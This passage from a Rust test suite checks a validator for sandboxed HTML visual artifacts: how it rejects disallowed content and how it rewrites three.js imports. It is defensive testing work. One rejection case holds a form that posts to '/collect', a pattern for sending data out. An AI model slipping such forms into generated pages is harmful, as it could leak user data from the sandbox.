            (r#"<form action="/collect"></form>"#, "/collect"),
        ];
        for (body, needle) in cases {
            let reason = reason("chart", "svg", body);
            assert!(
                reason.contains(needle),
                "{needle} must be named in the rejection: {reason}"
            );
        }
    }

    #[test]
    fn the_cube_fixture_stays_valid_including_a_string_replace_on_location_href() {
        let html =
            include_str!("../fixtures/visual-library/chapters/shapes/visuals/cube/index.html");
        let manifest_json =
            include_str!("../fixtures/visual-library/chapters/shapes/visuals/cube/manifest.json");
        validate("cube", html, manifest_json).expect("the cube fixture is a valid artifact");
        let body = r#"<script>const next = location.href.replace("/cube/", "/silent/");</script>"#;
        validate("chart", &page(body), &manifest("chart", "svg"))
            .expect("location.href.replace reads a string; it does not navigate");
    }

    #[test]
    fn a_default_three_import_is_rewritten_in_the_served_document() {
        let body = "<script type=\"module\">import THREE from \"three\";\nconst scene = new THREE.Scene();</script>";
        let (manifest, html) = accepted("cube", "three", body);
        let served = served_document(&manifest, &html);
        assert!(
            !served.contains("from \"three\""),
            "the default import is still in the served document: {served}"
        );
        assert!(
            served.contains("const THREE = globalThis.THREE;"),
            "{served}"
        );
        assert!(
            served.contains("const scene = new THREE.Scene();"),
            "{served}"
        );
    }

    #[test]
    fn a_default_and_named_three_import_is_rewritten_in_the_served_document() {
        let body =
            "<script type=\"module\">import THREE, { Scene, Mesh as M } from \"three\";</script>";
        let (manifest, html) = accepted("cube", "three", body);
        let served = served_document(&manifest, &html);
        assert!(!served.contains("from \"three\""), "{served}");
        assert!(
            served.contains("const THREE = globalThis.THREE;"),
            "{served}"
        );
        assert!(
            served.contains("const { Scene, Mesh: M } = globalThis.THREE;"),
            "{served}"
        );
    }

    #[test]
    fn an_unhandled_three_import_form_is_rejected_by_name() {
        let reason = reason(
            "cube",
            "three",
            "<script type=\"module\">import THREE, * as T from \"three\";</script>",
        );
        assert!(
            reason.contains("import THREE, * as T from \"three\""),
            "{reason}"
        );
    }
}
